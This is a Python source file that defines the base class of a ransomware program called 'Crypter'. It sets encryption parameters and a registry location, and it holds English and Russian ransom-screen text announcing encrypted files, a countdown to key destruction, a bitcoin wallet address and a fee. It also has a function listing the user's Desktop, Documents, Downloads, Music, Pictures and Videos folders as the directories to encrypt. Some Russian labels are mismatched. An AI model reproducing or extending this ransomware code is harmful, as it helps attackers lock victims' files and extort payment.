# -*- coding: utf-8 -*-
'''
@summary: Crypter: Base class for inheritence
@author: MLS
'''

# Import libs
import os
import locale

# Import classes

################
## Base class ##
################
class Base():
    '''
    @summary: Base Class. Defines schema for Crypter
    @todo: Continue with defining GUI schema
    '''

    # CORE SCHEMA
    BLOCK_SIZE_BYTES = 8192
    IV_SIZE = 16
    PADDING_BLOCK_SIZE = 16
    MAX_FILE_SIZE_BYTES = 536870912
    REGISTRY_LOCATION = r"SOFTWARE\\Crypter"
    RUNTIME_CONFIG_FILE = "runtime.cfg"
    BTC_BUTTON_URL = "https://www.coindesk.com/information/what-is-bitcoin/"

    # Get locale 
    if "ru" in locale.getdefaultlocale():
        #LANG = "ru"
        LANG = "eng"
    else:
        LANG = "eng"
    
    # GUI SCHEMA
    GUI_IMAGE_LOGO = "lock.bmp"
    GUI_IMAGE_BUTTON = "bitcoin.bmp"
    GUI_LABEL_TEXT_TITLE = {
        "eng": "CRYPTER",
        "ru": u"КРИПТЕР"
        }
    GUI_LABEL_TEXT_FLASHING_ENCRYPTED = {
        "eng": "YOUR FILES HAVE BEEN ENCRYPTED!",
        "ru": u"ВАШИ ФАЙЛИ БЫЛИ ЗАШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_FLASHING_DECRYPTED = {
        "eng": "YOUR FILES HAVE BEEN DECRYPTED!",
        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_FLASHING_DESTROYED = {
        "eng": "YOUR DECRYPTION KEY HAS BEEN DESTROYED!",
        "ru": u"ВАШИ ФАЙЛЫ БЫЛИ РАСШИФРАНЫ!"
    }
    GUI_LABEL_TEXT_TIME_REMAINING = {
        "eng": "TIME REMAINING",
        "ru": u"РАЗРУШЕНИЕ КЛЮЧА ЧЕРЕЗ: "
    }
    GUI_LABEL_TEXT_WALLET_ADDRESS = {
        "eng": "WALLET ADDRESS: ",
        "ru": u"АДРЕС КОШЕЛЬКА: "
    }
    GUI_LABEL_TEXT_BITCOIN_FEE = {
        "eng": "BITCOIN FEE: ",
        "ru": u"АДРЕС КОШЕЛЬКА: "
    }
    GUI_LABEL_TEXT_TIME_BLANK = {
        "eng": "--------",
        "ru": u"KEY DESTROYED"
    }
    GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES = {
        "eng": "View Encrypted Files",
        "ru": u"View Encrypted Files"
    }
    GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY = {
        "eng": "Enter Decryption Key",
        "ru": u"Enter Decryption Key"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY = {
        "eng": "Invalid Key!",
        "ru": u"Invalid Key!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_WAITING = {
        "eng": "Waiting for input",
        "ru": u"Waiting for input"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING = {
        "eng": "Decrypting! Please Wait",
        "ru": u"Decrypting! Please Wait"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED = {
        "eng": "Decryption Complete!",
        "ru": u"Decryption Complete!"
    }
    GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT = {
        "eng": "Encrypted Files: ",
        "ru": u"Encrypted Files: "
    }
    GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND = {
        "eng": "A list of encrypted files was not found",
        "ru": u"A list of encrypted files was not found"
    }
    
    FILES_TO_EXCLUDE = [
        "key.txt"
        ]
    

    def get_base_dirs(self, home_dir):
      # Function to return a list of base directories to encrypt
      # TODO Detect presence of network drives
      # TODO Improve overall functionality for getting list of locations to encrypt

      base_dirs = [
                    os.path.join(home_dir, "Desktop"),
                    os.path.join(home_dir, "Documents"),
                    os.path.join(home_dir, "Downloads"),
                    os.path.join(home_dir, "Music"),
                    os.path.join(home_dir, "Pictures"),
                    os.path.join(home_dir, "Videos")
                  ]

      return base_dirs

